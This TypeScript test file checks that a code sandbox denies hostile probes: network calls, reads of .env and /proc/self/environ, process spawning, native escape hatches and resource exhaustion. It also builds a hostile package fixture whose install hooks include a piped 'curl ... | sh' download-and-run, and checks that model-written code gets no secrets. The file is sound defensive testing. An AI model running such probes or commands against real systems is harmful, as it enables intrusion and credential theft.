/**
 * Mission 4 — independent security acceptance of the resource sandbox.
 * Each attack is real code run through the real sandbox; each assertion is
 * what the attack observed. Network-namespace isolation depends on the host
 * (`unshare -rn`); where it is unavailable the network checks still require
 * every attempt to fail, via the preload guard.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { runSandbox, sandboxInstall } from "../plugins/resourceApi";

const ROOT = process.cwd();
const attack = async (code: string) => runSandbox({ code });
const out = (r: { stdout: string }) => r.stdout.trim();

test("network: TCP, UDP, DNS and fetch all fail", async () => {
  for (const code of [
    `import net from "node:net"; const s = net.connect(53, "1.1.1.1"); s.on("connect", () => { console.log("CONNECTED"); process.exit(0); }); s.on("error", (e) => { console.log("denied:" + e.code); process.exit(0); }); setTimeout(() => { console.log("denied:timeout"); process.exit(0); }, 4000);`,
    // Node 26's permission model denies UDP access from inside createSocket()
    // itself and raises it asynchronously, so the probe must report an uncaught
    // denial as well as a send error. Without this the denial was real (exit 1,
    // ERR_ACCESS_DENIED) but invisible on stdout, which read as a bare empty
    // string rather than proof of a denied attempt.
    `import dgram from "node:dgram"; process.on("uncaughtException", (e) => { console.log("denied:" + (e.code ?? e.name)); process.exit(0); }); const s = dgram.createSocket("udp4"); s.send("x", 53, "1.1.1.1", (e) => { console.log(e ? "denied:" + e.code : "SENT"); process.exit(0); });`,
    `import dns from "node:dns/promises"; try { await dns.lookup("registry.npmjs.org"); console.log("RESOLVED"); } catch (e) { console.log("denied:" + e.code); }`,
    `try { await fetch("https://registry.npmjs.org/", { signal: AbortSignal.timeout(4000) }); console.log("FETCHED"); } catch (e) { console.log("denied:" + (e.cause?.code || e.name)); }`,
  ]) {
    assert.match(out(await attack(code)), /^denied:/);
  }
});

test("filesystem: traversal, absolute paths, /proc, symlinks and every write are denied", async () => {
  for (const code of [
    `import fs from "node:fs"; try { fs.readFileSync("../../../package.json"); console.log("READ"); } catch (e) { console.log("denied:" + e.code); }`,
    `import fs from "node:fs"; try { fs.readFileSync("${ROOT}/.env"); console.log("READ"); } catch (e) { console.log("denied:" + e.code); }`,
    `import fs from "node:fs"; try { fs.readFileSync("/proc/self/environ"); console.log("READ"); } catch (e) { console.log("denied:" + e.code); }`,
    `import fs from "node:fs"; try { fs.symlinkSync("${ROOT}/package.json", "./l.json"); console.log("LINKED"); } catch (e) { console.log("denied:" + e.code); }`,
    `import fs from "node:fs"; try { fs.writeFileSync("./x", "x"); console.log("WROTE"); } catch (e) { console.log("denied:" + e.code); }`,
    `import fs from "node:fs"; try { fs.writeFileSync("${ROOT}/.lelu-state/PWNED", "x"); console.log("WROTE"); } catch (e) { console.log("denied:" + e.code); }`,
  ]) {
    assert.match(out(await attack(code)), /^denied:/, code);
  }
  assert.equal(existsSync(path.join(ROOT, ".lelu-state/PWNED")), false);
});

test("processes and native escape hatches are denied; the environment carries no secret", async () => {
  process.env.LELU_FAKE_SECRET_TOKEN = "sk-never-visible-1234567890";
  for (const code of [
    `try { (await import("node:child_process")).execSync("id"); console.log("SPAWNED"); } catch (e) { console.log("denied:" + e.code); }`,
    `try { const { Worker } = await import("node:worker_threads"); new Worker("1", { eval: true }); console.log("WORKER"); } catch (e) { console.log("denied:" + e.code); }`,
    `try { process.binding("spawn_sync"); console.log("BINDING"); } catch (e) { console.log("denied:" + e.code); }`,
    `try { process.dlopen({ exports: {} }, "/usr/lib/x86_64-linux-gnu/libc.so.6"); console.log("DLOPEN"); } catch (e) { console.log("denied:" + e.code); }`,
    `try { (await import("node:inspector")).open(9229); console.log("INSPECTOR"); } catch (e) { console.log("denied:" + e.code); }`,
  ]) {
    assert.match(out(await attack(code)), /^denied:/, code);
  }
  const env = JSON.parse(out(await attack(`console.log(JSON.stringify(process.env))`)));
  assert.deepEqual(Object.keys(env).sort(), ["HOME", "NODE_OPTIONS", "PATH"]);
  delete process.env.LELU_FAKE_SECRET_TOKEN;
});

test("resource exhaustion: memory is capped, runaway code is killed, output is bounded", async () => {
  const bomb = await attack(`const a = []; while (true) a.push(new Array(1e6).fill(1));`);
  assert.equal(bomb.ok, false);
  assert.ok(bomb.durationMs < 10_000, `memory cap took ${bomb.durationMs} ms`);
  const flood = await attack(`const s = "x".repeat(1e5); for (let i = 0; i < 300; i++) process.stdout.write(s);`);
  assert.ok(flood.stdout.length <= 64 * 1024);
});

test("sandbox runs leave no installed code behind", async () => {
  const r = await runSandbox({ reuse: "three/examples/jsm/exporters/STLExporter.js", code: `console.log("ok")` });
  assert.equal(r.ok, true);
  assert.equal(existsSync(path.join(ROOT, ".lelu-state/sandbox", r.id, "node_modules")), false);
});

test("a malicious package's install-time scripts never run through the sandbox install", async () => {
  // A hostile package: every lifecycle hook tries to write a marker outside
  // its folder, one tries a piped download.
  const work = mkdtempSync(path.join(tmpdir(), "evil-"));
  const pkg = path.join(work, "evil-pkg");
  const marker = path.join(work, "PWNED");
  mkdirSync(pkg);
  const hook = `node -e "require('fs').writeFileSync('${marker}', 'x')"`;
  writeFileSync(path.join(pkg, "package.json"), JSON.stringify({
    name: "evil-pkg", version: "1.0.0",
    scripts: { preinstall: hook, install: hook, postinstall: `${hook} && curl -s http://127.0.0.1:1/x | sh`, prepare: hook },
  }));
  writeFileSync(path.join(pkg, "index.js"), "module.exports = 1;");
  // Packed with tar, NOT \`npm pack\`: measured on npm 10.9.9, \`npm pack
  // --ignore-scripts\` still runs "prepare" — packing hostile code would
  // itself execute it. (No LÉLU code path runs npm pack.)
  const tarball = path.join(work, "evil-pkg-1.0.0.tgz");
  const packed = spawnSync("tar", ["-czf", tarball, "--transform", "s,^evil-pkg,package,", "evil-pkg"], { cwd: work, encoding: "utf8" });
  assert.equal(packed.status, 0, packed.stderr);
  assert.equal(existsSync(marker), false, "fixture creation ran nothing");
  const target = path.join(work, "sandbox");
  mkdirSync(target);
  const result = await sandboxInstall(tarball, target);
  assert.equal(result.code, 0, result.stderr);
  assert.ok(readdirSync(path.join(target, "node_modules")).includes("evil-pkg"), "the package was installed");
  assert.equal(existsSync(marker), false, "no lifecycle script ran");
});

test("model-written code run by the engineering runtime gets no credentials (no key, no access-gate passphrase)", async () => {
  const { withoutSecrets } = await import("../plugins/nodeAdapters");
  const env = withoutSecrets({ PATH: "/bin", GROQ_API_KEY: "gsk_x", LELU_ACCESS_PASSWORD: "p", LELU_SESSION_SECRET: "s", GITHUB_TOKEN: "t", HTTPS_PROXY: "http://proxy", NODE_EXTRA_CA_CERTS: "/ca" });
  assert.deepEqual(Object.keys(env).sort(), ["HTTPS_PROXY", "NODE_EXTRA_CA_CERTS", "PATH"]);
  const src = (await import("node:fs")).readFileSync("plugins/nodeAdapters.ts", "utf8");
  const runner = src.slice(src.indexOf("async function runCommand("), src.indexOf("async function runCommand(") + 2500);
  assert.match(runner, /env: \{ \.\.\.withoutSecrets\(process\.env\)/, "the command runner (sandbox.execute) never inherits the raw environment");
});
